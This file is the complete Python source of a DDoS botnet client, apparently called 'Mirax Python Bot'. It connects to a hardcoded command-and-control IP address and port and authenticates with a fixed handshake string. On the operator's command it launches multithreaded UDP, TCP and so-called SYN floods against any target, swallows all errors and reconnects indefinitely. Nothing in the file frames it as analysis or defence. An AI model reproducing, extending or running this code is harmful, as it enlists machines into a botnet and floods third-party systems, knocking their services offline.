#!/usr/bin/env python3
# Mirax Python Bot - Fallback when Python is available
# This is a Python version of the bot

import socket
import time
import threading
import random
import os
import sys
import platform

C2_HOST = "85.11.167.41"
C2_PORT = 1337

def get_arch():
    arch = platform.machine().lower()
    arch_map = {
        'amd64': 'x86_64', 'x86_64': 'x86_64',
        'i386': 'i386', 'i686': 'i386',
        'armv7l': 'armv7l', 'armv8l': 'armv8l',
        'aarch64': 'aarch64', 'arm64': 'aarch64',
        'mips': 'mips', 'mipsel': 'mipsel',
        'ppc': 'ppc', 'ppc64': 'ppc64'
    }
    return arch_map.get(arch, arch or 'unknown')

def attack_udp(ip, port, end_time, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time:
            if stop_event.is_set():
                break
            packet = os.urandom(1024)
            for _ in range(10):
                s.sendto(packet, (ip, port))
    except:
        pass

def attack_tcp(ip, port, end_time, stop_event):
    while time.time() < end_time:
        if stop_event.is_set():
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            packet = os.urandom(1024)
            for _ in range(20):
                if stop_event.is_set():
                    break
                s.send(packet)
            s.close()
        except:
            pass

def attack_syn(ip, port, end_time, stop_event):
    while time.time() < end_time:
        if stop_event.is_set():
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(0)
            s.connect((ip, port))
            for _ in range(50):
                s.send(os.urandom(1024))
            s.close()
        except:
            pass

def start_attack(method, ip, port, duration, threads):
    stop_event = threading.Event()
    end_time = time.time() + duration
    
    attack_map = {
        'udp': attack_udp,
        'tcp': attack_tcp,
        'syn': attack_syn
    }
    
    if method not in attack_map:
        return
    
    attack_func = attack_map[method]
    
    for _ in range(threads):
        t = threading.Thread(target=attack_func, args=(ip, port, end_time, stop_event), daemon=True)
        t.start()

def main():
    arch = get_arch()
    
    while True:
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.settimeout(10)
            c2.connect((C2_HOST, C2_PORT))
            
            while True:
                data = c2.recv(1024).decode()
                if 'Username' in data:
                    c2.send(arch.encode())
                    break
                    
            while True:
                data = c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break
            
            while True:
                data = c2.recv(1024).decode().strip()
                if not data:
                    break
                args = data.split(' ')
                command = args[0].lower()
                
                if command == 'ping':
                    c2.send('PONG'.encode())
                elif len(args) >= 5:
                    method = args[0]
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    threads = int(args[4])
                    start_attack(method, ip, port, duration, threads)
        except:
            time.sleep(10)
            continue

if __name__ == '__main__':
    main()